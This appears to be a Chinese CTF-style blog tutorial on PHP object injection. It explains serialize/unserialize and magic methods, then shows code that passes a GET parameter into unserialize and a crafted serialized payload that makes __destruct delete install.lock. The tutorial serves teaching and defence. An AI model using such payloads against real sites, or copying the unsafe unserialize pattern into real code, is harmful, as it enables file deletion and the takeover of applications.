---
title: "PHP 对象注入"
date: 2018-05-13T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['php', 'ctf']
categories: ['Web安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

序列化 (serialize) 指将 PHP 变量/数组/函数/类 转换为可保存或传输的过程, 再通过反序列化 (unserialize) 转换为原来的数据使用.

<!--more-->

关于反序列化 有 3 个魔术方法.

```
__destruct - 程序结束时调用
__wakeup - 类被反序列化时调用
__toString - 类被作为字符串时调用
```

# Example 1

```
class Test{
	var $name = 'hello';
	public function __destruct(){
		echo $this->name;
	}
```

该类实例化后将在程序结束时打印出 name 的值.

更改 name 的值, 之后序列化.

```
$test = new Test();
$test->name = 'world';
echo serialize($test);

O:4:"Test":1:{s:4:"name";s:5:"world";}
```

反序列化.

```
$u = unserialize('O:4:"Test":1:{s:4:"name";s:5:"world";}');
```

```
world
```

# Example 2

```
class FileClass{

	var $filename;
	var $content;

	public function __construct($filename,$content){
		$this->filename = $filename;
		$this->content = $content;
	}

	public function write($content){
		file_put_contents($this->filename,$content);
	}

	public function __destruct(){
		echo 'clean file'.$this->filename;
		@unlink($this->filename);
	}
}

$u = unserialize($_GET['u']);
?>
```

利用

```
class FileClass{
	var $filename = 'install.lock';
}
echo serialize(new FileClass());
```

GET 传递 `O:9:"FileClass":1:{s:8:"filename";s:12:"install.lock";}`

```
clean file install.lock
```

# Other

参考 Typecho install.php 反序列化漏洞

https://paper.seebug.org/424/